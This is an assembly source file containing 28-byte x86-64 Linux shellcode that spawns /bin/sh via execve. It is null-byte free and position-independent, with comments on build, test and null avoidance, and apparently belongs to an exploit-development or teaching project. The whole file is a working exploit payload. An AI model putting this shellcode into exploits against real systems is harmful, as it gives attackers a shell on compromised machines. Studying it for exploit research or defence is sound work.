; src/shellcode/execve.asm
; ---------------------------------------------------------------------------
; execve("/bin/sh", NULL, NULL) — x86-64 Linux
; Position-independent, null-byte free, 28 bytes.
; ---------------------------------------------------------------------------
; Build:  make                # -> bin/execve (ELF), bin/execve.bin (raw)
; Test:   make test
; ---------------------------------------------------------------------------

global _start

section .text
_start:
    xor     rdx, rdx                 ; envp = NULL (rdx also yields a zero qword)

    push    rdx                      ; 8 bytes of 0x00 → null terminator on stack
    mov     rax, 0x68732f2f6e69622f   ; "/bin//sh" (8 chars, no embedded null)
    push    rax                      ; push the string
    mov     rdi, rsp                 ; argv[0] path = rdi -> "/bin//sh\0"

    xor     rsi, rsi                 ; argv = NULL
    xor     rax, rax
    mov     al, 0x3b                 ; syscall 59 = execve  (NOT mov eax,59 → nulls)
    syscall
